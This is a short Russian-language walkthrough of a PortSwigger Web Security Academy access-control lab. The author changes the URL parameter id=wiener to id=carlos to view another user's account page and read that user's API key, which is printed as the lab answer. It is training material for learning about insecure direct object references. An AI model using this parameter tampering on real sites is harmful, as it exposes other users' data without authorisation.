Залогинимся под пользователем `wiener:peter`
Видим, что в url у нас отображается наш юзер
```
https://0a09005a030fe83081d0754f002600dd.web-security-academy.net/my-account?id=wiener
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/7.%20Access%20control/7.%20User%20ID%20controlled%20by%20request%20parameter/pics%20for%20walktrough/1.png)

Нам известно, что существует пользователь `carlos`. Давайте изменим параметр `id=wiener` на параметр `id=carlos`, в надежде, что мы получим доступ до пользователя `carlos`
```
https://0a09005a030fe83081d0754f002600dd.web-security-academy.net/my-account?id=carlos
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/7.%20Access%20control/7.%20User%20ID%20controlled%20by%20request%20parameter/pics%20for%20walktrough/2.png)

И видим API ключ пользователя `carlos`, который мы сдадим как ответ на задание

`Your API Key is: taDd8R1Zo17s4PyONZjK5JwijAw31QdO`
